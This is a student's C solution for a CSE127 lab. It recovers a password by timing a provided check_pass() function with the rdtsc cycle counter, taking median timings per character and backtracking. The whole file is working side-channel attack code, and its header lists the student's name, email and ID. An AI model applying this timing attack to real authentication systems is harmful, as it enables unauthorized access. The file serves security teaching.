/*******************************************************
 CSE127 Project
 User routines file
 
   Name: Kieth Vo 
   Email: tienvo52@gmail.com
   Student ID: A09632897

  You can change anything in this file, just make sure 
  that when you have found the password, you call 
  hack_system() function on it.

 *******************************************************/


#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

// include our "system" header
#include "sysapp.h"

// Read cycle counter
#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })

int cmpfunc (const void * a, const void * b)
{
	return ( *(unsigned long*)a - *(unsigned long*)b );
}

int main(int argc, char ** argv) {
	char guess[33];

	// set guess to zeros
	bzero(guess, sizeof(guess));

	// do the guessing (this is where your code goes)
        //   we suggest a loop over the size of the possible 
        //   password, each time trying all possible characters
        //   and looking for time deviations
        int i;
	char ascii;
	unsigned long start_time;
	unsigned long end_time;
	unsigned long diff;
	unsigned long prev_maximum = 0;
	unsigned long prev_prev_maximum = 0;
	int n = 0;

	for (i = 0; i < 33; i++)
	{
		unsigned long guess_medians[94];
		for(ascii = 33; ascii < 127; ascii++)
		{
			guess[i] = ascii;			
			unsigned long char_medians[101];
			int j;
			for (j = 0; j < 101; j++)
			{
				start_time = rdtsc();
				if (check_pass(guess))
				{
					printf("Password Found!\n");
	  				hack_system(guess);
				}
				end_time = rdtsc();
				diff = end_time - start_time;
				char_medians[j] = diff;
			}
			qsort(char_medians, 101, sizeof(unsigned long), cmpfunc);
			guess_medians [ascii-33] = char_medians[50];
		}
		int j;
		unsigned long maximum = guess_medians[0];
		char guess_character = 33;
		for (j = 1; j < 94; j++)
		{
			if (guess_medians[j] > maximum)
			{
				maximum = guess_medians[j];
				guess_character = j + 33;
			}
		}
		
		// Backtracking part
		guess[i] = guess_character;
		start_time = rdtsc();
		if (check_pass(guess))
		{
			break;
		}
		end_time = rdtsc();
		diff = end_time - start_time;

		if (prev_maximum > diff)
		{
			i-=2;
			prev_maximum = prev_prev_maximum;
		}
		else
		{
			prev_prev_maximum = prev_maximum;
			prev_maximum = diff;
		}
	}
	/*
	if (check_pass(guess)) {
	  printf("Password Found!\n");
	  hack_system(guess);
	};*/


	printf("Could not get the password!  Last guess was %s\n", guess);
	return 1;
};
